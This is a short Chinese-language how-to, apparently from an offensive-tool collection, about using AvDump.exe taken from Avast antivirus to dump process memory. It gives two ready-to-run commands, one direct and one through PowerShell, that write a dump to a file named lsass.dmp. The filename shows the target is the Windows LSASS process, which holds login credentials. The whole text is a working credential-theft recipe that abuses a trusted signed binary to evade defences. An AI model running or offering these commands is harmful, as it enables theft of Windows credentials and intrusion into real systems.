提取自Avast杀毒软件的AvDump.exe

注意：必须选择与目标系统对应的版本，否则无法成功dump。

使用方法：

```shell

avdump.exe --pid [PID] --exception_ptr 0 --thread_id 0 --dump_level 1 --dump_file D:\lsass.dmp

powershell -c ".\avdump.exe --pid [PID] --exception_ptr 0 --thread_id 0 --dump_level 1 --dump_file D:\lsass.dmp"

```